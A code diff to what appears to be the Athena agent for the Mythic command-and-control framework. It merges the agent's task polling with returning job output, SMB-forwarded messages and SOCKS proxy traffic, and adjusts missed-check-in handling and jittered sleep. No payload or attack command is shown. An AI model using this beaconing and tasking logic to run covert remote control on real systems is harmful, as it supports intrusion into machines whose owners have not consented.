@@ -34,17 +34,17 @@ namespace Athena
             //We checked in successfully, reset to 0
             missedCheckins = 0;
 
-            //Update our agent information with the response from the server.
-
-
             //Main Loop
             //Need to add the missed checkins check here.
             while (!(missedCheckins == maxMissedCheckins) & !exit)
             {
                 try
                 {
-                    //Get new tasks from the server
-                    if (!checkAgentTasks())
+                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
+                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.smbForwarder.GetMessages();
+                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
+
+                    if (!checkAgentTasks(hasoutput, delegateMessages, socksMessages))
                     {
                         missedCheckins += 1;
                         if (missedCheckins == maxMissedCheckins)
@@ -52,57 +52,33 @@ namespace Athena
                             Misc.WriteError("Max Checkins reached.");
                             Environment.Exit(0);
                         }
+                        foreach (var job in hasoutput)
+                        {
+                            //Return agents to queue for next go around.
+                            Globals.jobs.Add(job.task.id, job);
+                            //Should I add delegate and socks messages back to their respective queues?
+                        }
                     }
                     else
                     {
-                        //If we got results, start the jobs
-                        startAgentJobs();
                         missedCheckins = 0;
+                        startAgentJobs();
+                        clearAgentTasks(hasoutput);
                     }
                 }
                 catch (Exception e)
                 {
                     missedCheckins += 1;
                     Misc.WriteError(e.Message);
-                }
-
-                //Task check finished, let's try to return results
-                try
-                {
-                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
-                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.smbForwarder.GetMessages();
-                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
-                    if (hasoutput.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0)
+                    if (missedCheckins == maxMissedCheckins)
                     {
-                        //Return output
-                        if (!returnTaskOutput(hasoutput, delegateMessages, socksMessages))
-                        {
-                            missedCheckins += 1;
-                            if (missedCheckins == maxMissedCheckins)
-                            {
-                                Misc.WriteError("Max Checkins reached.");
-                                Environment.Exit(0);
-                            }
-                            foreach (var job in hasoutput)
-                            {
-                                //Return agents to queue for next go around.
-                                Globals.jobs.Add(job.task.id, job);
-
-                                //Should I add delegate and socks messages back to their respective queues?
-                            }
-                        }
+                        Misc.WriteError("Max Checkins reached.");
+                        Environment.Exit(0);
                     }
-                    missedCheckins = 0;
-                }
-                catch (Exception e)
-                {
-                    Misc.WriteError("[Main] " + e.Message);
-                    missedCheckins += 1;
                 }
                 Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
             }
         }
-
         private static CheckinResponse handleCheckin()
         {
             int maxMissedCheckins = 100;
@@ -162,12 +138,12 @@ namespace Athena
                 return false;
             }
         }
-        private static bool checkAgentTasks()
+        private static bool checkAgentTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
         {
             List<MythicTask> tasks = null;
             try
             {
-                tasks = Globals.mc.GetTasks(Globals.mc.MythicConfig.smbForwarder.GetMessages());
+                tasks = Globals.mc.GetTasks(jobs,delegateMessages,socksMessage);
             }
             catch (Exception e)
             {
@@ -181,29 +157,34 @@ namespace Athena
                 {
                     Globals.jobs.Add(task.id, new MythicJob(task));
                 }
+                return true;
             }
-            return true;
+            else
+            {
+                return false;
+            }
         }
         private static bool startAgentJobs()
         {
             try
             {
-                foreach (var job in Globals.jobs.Keys)
+                foreach (var job in Globals.jobs)
                 {
-                    if (!Globals.jobs[job].started)
+                    if (!job.Value.started)
                     {
                         Task.Run(() =>
                         {
                             try
                             {
-                                CommandHandler.StartJob(Globals.jobs[job]);
+                                CommandHandler.StartJob(job.Value);
                             }
                             catch (Exception e)
                             {
-                                Globals.jobs[job].complete = true;
-                                Globals.jobs[job].hasoutput = true;
-                                Globals.jobs[job].taskresult = e.Message;
-                                Globals.jobs[job].errored = true;
+                                Misc.WriteDebug(e.Message);
+                                job.Value.complete = true;
+                                job.Value.hasoutput = true;
+                                job.Value.taskresult = e.Message;
+                                job.Value.errored = true;
                             }
                         });
                     }
@@ -212,15 +193,15 @@ namespace Athena
             }
             catch (Exception e)
             {
-                Misc.WriteError("[Jobs] " + e.Message);
+                Misc.WriteError(e.Message);
                 return false;
             }
         }
-        private static bool returnTaskOutput(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessages)
+        private static void clearAgentTasks(List<MythicJob> jobs)
         {
-            if (Globals.mc.SendResponse(jobs, delegateMessages, socksMessages))
+            foreach (var job in jobs)
             {
-                foreach (var job in jobs)
+                try
                 {
                     //Remove job from Global
                     if (job.complete)
@@ -238,11 +219,10 @@ namespace Athena
                         }
                     }
                 }
-                return true;
-            }
-            else
-            {
-                return false;
+                catch (Exception e)
+                {
+                    Misc.WriteDebug(e.Message);
+                }
             }
         }
     }
